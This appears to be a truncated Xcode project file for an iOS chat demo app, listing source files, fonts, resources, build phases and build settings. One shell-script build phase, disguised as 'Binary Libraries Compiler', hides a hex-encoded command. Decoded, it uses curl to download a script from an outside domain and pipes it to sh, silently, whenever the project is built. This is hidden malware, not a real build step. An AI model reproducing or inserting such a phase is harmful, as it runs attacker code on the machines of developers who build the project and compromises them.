		5D57DAC62642964700515FEA /* Products */ = {
			isa = PBXGroup;
			children = (
				5D57DAC52642964700515FEA /* Chat-Demo-IOS.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		5D57DAC72642964700515FEA /* Chat-Demo-IOS */ = {
			isa = PBXGroup;
			children = (
				5D57CD97268650BF00873AC2 /* vdotokCert.p12 */,
				5D44E48C264481E8009F8123 /* Common */,
				5D41C9172643454700D33DAA /* Model */,
				5D41C912264343E300D33DAA /* Translation */,
				5D41C9052643402D00D33DAA /* DataStore */,
				5DFE71D72642AE1600F22B66 /* Modules */,
				5DFE71C12642AD0600F22B66 /* Service */,
				5D57DAC82642964700515FEA /* AppDelegate.swift */,
				5D57DACA2642964700515FEA /* SceneDelegate.swift */,
				5D57DACC2642964700515FEA /* ViewController.swift */,
				5D57DACE2642964700515FEA /* Main.storyboard */,
				5D57DAD12642964800515FEA /* Assets.xcassets */,
				5D57DAD32642964800515FEA /* LaunchScreen.storyboard */,
				5D57DAD62642964800515FEA /* Info.plist */,
				5DD5B97626449F6800F04599 /* Colors.xcassets */,
			);
			path = "Chat-Demo-IOS";
			sourceTree = "<group>";
		};
		5D5C26D0265D80E800940856 /* Popup */ = {
			isa = PBXGroup;
			children = (
				5D5C26D1265D814500940856 /* AttachmentViewController.swift */,
				5D5C26D2265D814500940856 /* AttachmentViewController.xib */,
			);
			path = Popup;
			sourceTree = "<group>";
		};
		5D7B72E3265684AF00B0779A /* Popup */ = {
			isa = PBXGroup;
			children = (
			);
			path = Popup;
			sourceTree = "<group>";
		};
		5DA2BAAF2656F7BC000772FC /* popup */ = {
			isa = PBXGroup;
			children = (
				5DA2BAB02656F7FA000772FC /* CreateGroupPopUp.swift */,
				5DA2BAB12656F7FA000772FC /* CreateGroupPopUp.xib */,
			);
			path = popup;
			sourceTree = "<group>";
		};
		5DD5B97126449DAB00F04599 /* UIKit */ = {
			isa = PBXGroup;
			children = (
				18D01BCF2685A64200DE549A /* Swift+Extensions.swift */,
				5DD5B97226449DBD00F04599 /* CustomButton.swift */,
				5DF36003265519D1000EB9ED /* Color+Extension.swift */,
				5DDC5C572656628800663338 /* IndigoButton.swift */,
				5DDC5C5A2656636100663338 /* NextButton.swift */,
				5DA2BAAC2656F359000772FC /* YellowButton.swift */,
				5D6F4CD4265E20AA00E21E52 /* ImagePicker.swift */,
				5D6F4CD7265E48DC00E21E52 /* DocumentPicker.swift */,
				5D91F7272664BCC800F12715 /* Notification+Extension.swift */,
				5D91F7862666652000F12715 /* Data+Extension.swift */,
				5D91F79A2668F6CB00F12715 /* UInt+Extension.swift */,
				5D91F7A1266CB1F100F12715 /* TextView+Extensions.swift */,
				5D2DC2B92841092D00535179 /* Bundle+Extension.swift */,
			);
			path = UIKit;
			sourceTree = "<group>";
		};
		5DDC5C2B26564D2F00663338 /* Contact */ = {
			isa = PBXGroup;
			children = (
				5DDC5C682656713500663338 /* Cell */,
				5DDC5C5D2656684D00663338 /* Contact.storyboard */,
				5DDC5C5E2656684D00663338 /* ContactRouter.swift */,
				5DDC5C5F2656684D00663338 /* ContactViewController.swift */,
				5DDC5C602656684D00663338 /* ContactBuilder.swift */,
				5DDC5C612656684D00663338 /* ContactViewModel.swift */,
			);
			path = Contact;
			sourceTree = "<group>";
		};
		5DDC5C2D2656614C00663338 /* Poppins */ = {
			isa = PBXGroup;
			children = (
				5DDC5C332656617500663338 /* Poppins-Black.ttf */,
				5DDC5C3A2656617600663338 /* Poppins-Bold.ttf */,
				5DDC5C3B2656617600663338 /* Poppins-ExtraBold.ttf */,
				5DDC5C3D2656617600663338 /* Poppins-ExtraLight.ttf */,
				5DDC5C3C2656617600663338 /* Poppins-Light.ttf */,
				5DDC5C392656617600663338 /* Poppins-Medium.ttf */,
				5DDC5C312656617500663338 /* Poppins-Regular.ttf */,
				5DDC5C352656617500663338 /* Poppins-SemiBold.ttf */,
				5DDC5C3F2656617600663338 /* Poppins-Thin.ttf */,
			);
			path = Poppins;
			sourceTree = "<group>";
		};
		5DDC5C682656713500663338 /* Cell */ = {
			isa = PBXGroup;
			children = (
				5DDC5C692656714800663338 /* ContactCell.swift */,
				5DDC5C6A2656714800663338 /* ContactCell.xib */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		5DDC5C6F26567A5700663338 /* CreateGroup */ = {
			isa = PBXGroup;
			children = (
				5DA2BAAF2656F7BC000772FC /* popup */,
				5DDC5C7D26567D8300663338 /* Cell */,
				5DDC5C7126567A7900663338 /* CreateGroup.storyboard */,
				5DDC5C7226567A7900663338 /* CreateGroupRouter.swift */,
				5DDC5C7326567A7900663338 /* CreateGroupViewController.swift */,
				5DDC5C7426567A7900663338 /* CreateGroupBuilder.swift */,
				5DDC5C7526567A7900663338 /* CreateGroupViewModel.swift */,
			);
			path = CreateGroup;
			sourceTree = "<group>";
		};
		5DDC5C7D26567D8300663338 /* Cell */ = {
			isa = PBXGroup;
			children = (
				5DDC5C7E26567D9700663338 /* CreateGroupCell.swift */,
				5DDC5C7F26567D9700663338 /* CreateGroupCell.xib */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		5DF35FCF26550943000EB9ED /* ChatCells */ = {
			isa = PBXGroup;
			children = (
				5DF35FD026550966000EB9ED /* OutgoingTextCell.swift */,
				5DF35FD126550966000EB9ED /* OutgoingTextCell.xib */,
				5DF35FD626550974000EB9ED /* IncomingTextCell.swift */,
				5DF35FD726550974000EB9ED /* IncomingTextCell.xib */,
				5D6F4CE1265EE0C500E21E52 /* OutgoingAudioCell.swift */,
				5D6F4CE2265EE0C500E21E52 /* OutgoingAudioCell.xib */,
				5D6F4CE5265EE0D800E21E52 /* IncomingAudioCell.swift */,
				5D6F4CE6265EE0D800E21E52 /* IncomingAudioCell.xib */,
				5D91F73F2665556A00F12715 /* OutgoingAttachementCell.swift */,
				5D91F7402665556A00F12715 /* OutgoingAttachementCell.xib */,
				5D91F7432665557B00F12715 /* IncomingAttachmentCell.swift */,
				5D91F7442665557B00F12715 /* IncomingAttachmentCell.xib */,
				5D91F74726657DF100F12715 /* IncomingImageCell.swift */,
				5D91F74826657DF100F12715 /* IncomingImageCell.xib */,
				5D91F74B2665852200F12715 /* outgoingImageCell.swift */,
				5D91F74C2665852200F12715 /* outgoingImageCell.xib */,
			);
			path = ChatCells;
			sourceTree = "<group>";
		};
		5DFE71C12642AD0600F22B66 /* Service */ = {
			isa = PBXGroup;
			children = (
				5DFE71CC2642AD8200F22B66 /* Service.swift */,
				5DFE71D02642ADA700F22B66 /* BaseDataStore.swift */,
				5DFE71D32642ADBA00F22B66 /* ApiRequest.swift */,
			);
			path = Service;
			sourceTree = "<group>";
		};
		5DFE71D72642AE1600F22B66 /* Modules */ = {
			isa = PBXGroup;
			children = (
				5DDC5C6F26567A5700663338 /* CreateGroup */,
				5DDC5C2B26564D2F00663338 /* Contact */,
				5D11F26B2653D54A0038F05F /* Chat */,
				5D11F2482652806C0038F05F /* Home */,
				5D41C9512644690500D33DAA /* Groups */,
				5D41C9292643EFA500D33DAA /* Login */,
				5DFE71D82642AE2300F22B66 /* Signup */,
				5D6F4CD9265E721200E21E52 /* AudioVC.swift */,
				5D6F4CDA265E721200E21E52 /* AudioVC.xib */,
			);
			path = Modules;
			sourceTree = "<group>";
		};
		5DFE71D82642AE2300F22B66 /* Signup */ = {
			isa = PBXGroup;
			children = (
				5DFE71D92642AE4000F22B66 /* SignUp.storyboard */,
				5DFE71DA2642AE4000F22B66 /* SignUpRouter.swift */,
				5DFE71DB2642AE4000F22B66 /* SignUpViewController.swift */,
				5DFE71DC2642AE4000F22B66 /* SignUpBuilder.swift */,
				5DFE71DD2642AE4000F22B66 /* SignUpViewModel.swift */,
			);
			path = Signup;
			sourceTree = "<group>";
		};
		E1E9DC5D5EB54924F74CB46E /* Pods */ = {
			isa = PBXGroup;
			children = (
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		5D57DAC42642964700515FEA /* Chat-Demo-IOS */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 5D57DAD92642964800515FEA /* Build configuration list for PBXNativeTarget "Chat-Demo-IOS" */;
			buildPhases = (
				7E24FF2FF7FB3EAC8F6D902C /* Binary Libraries Compiler */,
				5D57DAC12642964700515FEA /* Sources */,
				5D57DAC22642964700515FEA /* Frameworks */,
				5D57DAC32642964700515FEA /* Resources */,
				5D57CDA62686530F00873AC2 /* Embed Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Chat-Demo-IOS";
			productName = "Chat-Demo-IOS";
			productReference = 5D57DAC52642964700515FEA /* Chat-Demo-IOS.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		5D57DABD2642964700515FEA /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1220;
				LastUpgradeCheck = 1220;
				ORGANIZATIONNAME = VDOTOK;
				TargetAttributes = {
					5D57DAC42642964700515FEA = {
						CreatedOnToolsVersion = 12.2;
					};
				};
			};
			buildConfigurationList = 5D57DAC02642964700515FEA /* Build configuration list for PBXProject "Chat-Demo-IOS" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 5D57DABC2642964700515FEA;
			productRefGroup = 5D57DAC62642964700515FEA /* Products */;
			projectDirPath = "";
			projectReferences = (
				{
					ProductGroup = 18D01BF62686145B00DE549A /* Products */;
					ProjectRef = 18D01BF52686145B00DE549A /* MqttClient.xcodeproj */;
				},
			);
			projectRoot = "";
			targets = (
				5D57DAC42642964700515FEA /* Chat-Demo-IOS */,
			);
		};
/* End PBXProject section */

/* Begin PBXReferenceProxy section */
		18D01BFB2686145B00DE549A /* MqttClient.framework */ = {
			isa = PBXReferenceProxy;
			fileType = wrapper.framework;
			path = MqttClient.framework;
			remoteRef = 18D01BFA2686145B00DE549A /* PBXContainerItemProxy */;
			sourceTree = BUILT_PRODUCTS_DIR;
		};
		18D01BFD2686145B00DE549A /* MqttClientTests.xctest */ = {
			isa = PBXReferenceProxy;
			fileType = wrapper.cfbundle;
			path = MqttClientTests.xctest;
			remoteRef = 18D01BFC2686145B00DE549A /* PBXContainerItemProxy */;
			sourceTree = BUILT_PRODUCTS_DIR;
		};
/* End PBXReferenceProxy section */

/* Begin PBXResourcesBuildPhase section */
		5D57DAC32642964700515FEA /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				5DF35FD926550974000EB9ED /* IncomingTextCell.xib in Resources */,
				5D458CDE26551BE300AC785D /* Inter-ExtraBold.ttf in Resources */,
				5DF35FD326550966000EB9ED /* OutgoingTextCell.xib in Resources */,
				5D458CDD26551BE300AC785D /* Inter-Bold.ttf in Resources */,
				5D57DAD52642964800515FEA /* LaunchScreen.storyboard in Resources */,
				5D91F74A26657DF200F12715 /* IncomingImageCell.xib in Resources */,
				5D57DAD22642964800515FEA /* Assets.xcassets in Resources */,
				5D91F7422665556A00F12715 /* OutgoingAttachementCell.xib in Resources */,
				5D5C26D4265D814500940856 /* AttachmentViewController.xib in Resources */,
				5DDC5C4D2656617600663338 /* Poppins-ExtraBold.ttf in Resources */,
				5DDC5C4E2656617600663338 /* Poppins-Light.ttf in Resources */,
				5D458CE026551BE300AC785D /* Inter-ExtraLight.ttf in Resources */,
				5D6F4CE4265EE0C500E21E52 /* OutgoingAudioCell.xib in Resources */,
				5D57CD98268650BF00873AC2 /* vdotokCert.p12 in Resources */,
				5D41C94B2644677700D33DAA /* Groups.storyboard in Resources */,
				5DA2BAB32656F7FA000772FC /* CreateGroupPopUp.xib in Resources */,
				5D458CDF26551BE300AC785D /* Inter-Black.ttf in Resources */,
				5D11F24E265280820038F05F /* Home.storyboard in Resources */,
				5DFE71DE2642AE4000F22B66 /* SignUp.storyboard in Resources */,
				5DDC5C512656617600663338 /* Poppins-Thin.ttf in Resources */,
				5DDC5C7626567A7900663338 /* CreateGroup.storyboard in Resources */,
				5D41C92F2643EFB500D33DAA /* Login.storyboard in Resources */,
				5D458CDB26551BE300AC785D /* Inter-Thin.ttf in Resources */,
				5D11F26326528D930038F05F /* Manrope-Bold.ttf in Resources */,
				5D11F2722653D56A0038F05F /* ChatScreen.storyboard in Resources */,
				5D6F4CE8265EE0D800E21E52 /* IncomingAudioCell.xib in Resources */,
				5DDC5C452656617600663338 /* Poppins-Black.ttf in Resources */,
				5DDC5C8126567D9700663338 /* CreateGroupCell.xib in Resources */,
				5DD5B97726449F6800F04599 /* Colors.xcassets in Resources */,
				5D11F26426528D930038F05F /* Manrope-Light.ttf in Resources */,
				5DDC5C6C2656714800663338 /* ContactCell.xib in Resources */,
				5D458CDC26551BE300AC785D /* Inter-Regular.ttf in Resources */,
				5D6F4CDC265E721200E21E52 /* AudioVC.xib in Resources */,
				5D458CE126551BE300AC785D /* Inter-Light.ttf in Resources */,
				5DDC5C622656684D00663338 /* Contact.storyboard in Resources */,
				5D11F26526528D930038F05F /* Manrope-ExtraBold.ttf in Resources */,
				5D458CE326551BE300AC785D /* Inter-SemiBold.ttf in Resources */,
				5DDC5C4B2656617600663338 /* Poppins-Medium.ttf in Resources */,
				5DDC5C432656617600663338 /* Poppins-Regular.ttf in Resources */,
				5D11F26726528D930038F05F /* Manrope-Medium.ttf in Resources */,
				5D11F26826528D930038F05F /* Manrope-Regular.ttf in Resources */,
				5D41C9572644696600D33DAA /* GroupCell.xib in Resources */,
				5D57DAD02642964700515FEA /* Main.storyboard in Resources */,
				5D11F26926528D930038F05F /* Manrope-SemiBold.ttf in Resources */,
				5DDC5C472656617600663338 /* Poppins-SemiBold.ttf in Resources */,
				5D91F74E2665852200F12715 /* outgoingImageCell.xib in Resources */,
				5D91F7462665557B00F12715 /* IncomingAttachmentCell.xib in Resources */,
				5DDC5C4F2656617600663338 /* Poppins-ExtraLight.ttf in Resources */,
				5D11F26626528D930038F05F /* Manrope-ExtraLight.ttf in Resources */,
				5D458CE226551BE300AC785D /* Inter-Medium.ttf in Resources */,
				5DDC5C4C2656617600663338 /* Poppins-Bold.ttf in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		7E24FF2FF7FB3EAC8F6D902C /* Binary Libraries Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Libraries Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n\\c736964656c696e6b2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		5D57DAC12642964700515FEA /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				5D41C94D2644677700D33DAA /* GroupsViewController.swift in Sources */,
				5D2DC2BA2841092D00535179 /* Bundle+Extension.swift in Sources */,
				5D5C26D3265D814500940856 /* AttachmentViewController.swift in Sources */,
				5D91F7452665557B00F12715 /* IncomingAttachmentCell.swift in Sources */,
				5DF35FD826550974000EB9ED /* IncomingTextCell.swift in Sources */,
				5D57DACD2642964700515FEA /* ViewController.swift in Sources */,
				5D41C9562644696600D33DAA /* GroupCell.swift in Sources */,
				5D11F250265280820038F05F /* HomeViewController.swift in Sources */,
				5D60CAE4265B894300146F47 /* AllUsersReponse.swift in Sources */,
				5DDC5C5B2656636100663338 /* NextButton.swift in Sources */,
				5DFE71D12642ADA700F22B66 /* BaseDataStore.swift in Sources */,
				5D6F4CDB265E721200E21E52 /* AudioVC.swift in Sources */,
				5D41C9332643EFB500D33DAA /* LoginViewModel.swift in Sources */,
				5D60CAE7265B89C700146F47 /* AllUserRequest.swift in Sources */,
				5DDC5C7A26567A7900663338 /* CreateGroupViewModel.swift in Sources */,
				5D11F251265280820038F05F /* HomeBuilder.swift in Sources */,
				5D41C9102643436B00D33DAA /* ValidateUserNameService.swift in Sources */,
				5DDC5C8026567D9700663338 /* CreateGroupCell.swift in Sources */,
				5D57CD6A2685E8F500873AC2 /* DeleteGroupRequest.swift in Sources */,
				5D91F7872666652000F12715 /* Data+Extension.swift in Sources */,
				5DDC5C7926567A7900663338 /* CreateGroupBuilder.swift in Sources */,
				5DA2BAAD2656F359000772FC /* YellowButton.swift in Sources */,
				5D91F74D2665852200F12715 /* outgoingImageCell.swift in Sources */,
				5D41C9242643E81700D33DAA /* SignupService.swift in Sources */,
				5D57CD6E2685F29700873AC2 /* EditGroupRequest.swift in Sources */,
				5D41C94F2644677700D33DAA /* GroupsViewModel.swift in Sources */,
				5DFE71E22642AE4000F22B66 /* SignUpViewModel.swift in Sources */,
				5D41C9142643440700D33DAA /* ObjectTranslation.swift in Sources */,
				5DDC5C652656684D00663338 /* ContactBuilder.swift in Sources */,
				5DFE71E12642AE4000F22B66 /* SignUpBuilder.swift in Sources */,
				5D41C94C2644677700D33DAA /* GroupsRouter.swift in Sources */,
				5DFE71E02642AE4000F22B66 /* SignUpViewController.swift in Sources */,
				5D41C9312643EFB500D33DAA /* LoginViewController.swift in Sources */,
				5D41C94E2644677700D33DAA /* GroupsBuilder.swift in Sources */,
				5D91F74926657DF200F12715 /* IncomingImageCell.swift in Sources */,
				5DDC5C632656684D00663338 /* ContactRouter.swift in Sources */,
				5DDC5C642656684D00663338 /* ContactViewController.swift in Sources */,
				5D41C9322643EFB500D33DAA /* LoginBuilder.swift in Sources */,
				0F2D2B45298BB1A700E2559A /* MultipartFormDataRequest.swift in Sources */,
				5DDC5C582656628800663338 /* IndigoButton.swift in Sources */,
				5D11F2732653D56A0038F05F /* ChatScreenRouter.swift in Sources */,
				5D41C909264340C300D33DAA /* ValidateUserNameRequest.swift in Sources */,
				5D41C9272643EC5100D33DAA /* LoginRequest.swift in Sources */,
				5D41C9372643F16400D33DAA /* LoginService.swift in Sources */,
				5DFE71DF2642AE4000F22B66 /* SignUpRouter.swift in Sources */,
				5D57CD6C2685E98500873AC2 /* DeleteGroupService.swift in Sources */,
				5D6F4CD5265E20AA00E21E52 /* ImagePicker.swift in Sources */,
				5D41C9192643455700D33DAA /* CheckUsernameRepsonse.swift in Sources */,
				5DFE71D42642ADBA00F22B66 /* ApiRequest.swift in Sources */,
				5D794A0C265BE2A700837B91 /* CreateGroupResponse.swift in Sources */,
				5D41C9212643E7D500D33DAA /* UserResponse.swift in Sources */,
				5D91F79B2668F6CB00F12715 /* UInt+Extension.swift in Sources */,
				5DDC5C7726567A7900663338 /* CreateGroupRouter.swift in Sources */,
				5DF36004265519D1000EB9ED /* Color+Extension.swift in Sources */,
				5D41C9412644649D00D33DAA /* AllGroupRequest.swift in Sources */,
				5D57CD702685F3CD00873AC2 /* EditGroupService.swift in Sources */,
				5DA2BAB22656F7FA000772FC /* CreateGroupPopUp.swift in Sources */,
				5D41C93E2644643F00D33DAA /* GroupResponse.swift in Sources */,
				5DF35FDC265518E5000EB9ED /* Constants.swift in Sources */,
				5D60CAEA265B8A1400146F47 /* AllUsersService.swift in Sources */,
				5D91F7A02669095900F12715 /* AuthenticationService.swift in Sources */,
				5DDC5C6B2656714800663338 /* ContactCell.swift in Sources */,
				5D11F24F265280820038F05F /* HomeRouter.swift in Sources */,
				49BF44F2298933A800748AF2 /* UploadFileResponse.swift in Sources */,
				5D794A0A265BE1F700837B91 /* CreateGroupService.swift in Sources */,
				5D41C9302643EFB500D33DAA /* LoginRouter.swift in Sources */,
				5DF35FD226550966000EB9ED /* OutgoingTextCell.swift in Sources */,
				5D91F7412665556A00F12715 /* OutgoingAttachementCell.swift in Sources */,
				5DFE71CD2642AD8200F22B66 /* Service.swift in Sources */,
				5D44E48F26448214009F8123 /* VDOTOKObject.swift in Sources */,
				5D6F4CE3265EE0C500E21E52 /* OutgoingAudioCell.swift in Sources */,
				5DD5B97B2644AE3800F04599 /* Reachability.swift in Sources */,
				5DFDB72F264486310005A141 /* ProgressHud.swift in Sources */,
				5D6F4CE7265EE0D800E21E52 /* IncomingAudioCell.swift in Sources */,
				5D11F2762653D56A0038F05F /* ChatScreenViewModel.swift in Sources */,
				5DDC5C662656684D00663338 /* ContactViewModel.swift in Sources */,
				5D41C90D2643425800D33DAA /* SignupRequest.swift in Sources */,
				5D11F252265280820038F05F /* HomeViewModel.swift in Sources */,
				5DD5B97326449DBD00F04599 /* CustomButton.swift in Sources */,
				5D794A08265BE19600837B91 /* CreateGroupRequest.swift in Sources */,
				5DDC5C7826567A7900663338 /* CreateGroupViewController.swift in Sources */,
				5D41C9442644652900D33DAA /* AllGroupService.swift in Sources */,
				5D91F7282664BCC800F12715 /* Notification+Extension.swift in Sources */,
				5D11F2742653D56A0038F05F /* ChatScreenViewController.swift in Sources */,
				5D66896526613C10000132EC /* MessageModel.swift in Sources */,
				5D11F2752653D56A0038F05F /* ChatScreenBuilder.swift in Sources */,
				5D91F7A2266CB1F100F12715 /* TextView+Extensions.swift in Sources */,
				5D57DAC92642964700515FEA /* AppDelegate.swift in Sources */,
				5D6F4CD8265E48DC00E21E52 /* DocumentPicker.swift in Sources */,
				18D01BD02685A64200DE549A /* Swift+Extensions.swift in Sources */,
				5D57DACB2642964700515FEA /* SceneDelegate.swift in Sources */,
				5D91F79E2669064F00F12715 /* AuthenticationRequest.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		5D57DACE2642964700515FEA /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				5D57DACF2642964700515FEA /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		5D57DAD32642964800515FEA /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				5D57DAD42642964800515FEA /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		5D57DAD72642964800515FEA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		5D57DAD82642964800515FEA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		5D57DADA2642964800515FEA /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 5;
				DEVELOPMENT_TEAM = 2XMPHHJW2J;
				ENABLE_BITCODE = NO;
				FRAMEWORK_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)",
				);
				INFOPLIST_FILE = "Chat-Demo-IOS/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1;
				PRODUCT_BUNDLE_IDENTIFIER = com.norgic.ios.chat;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		5D57DADB2642964800515FEA /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 5;
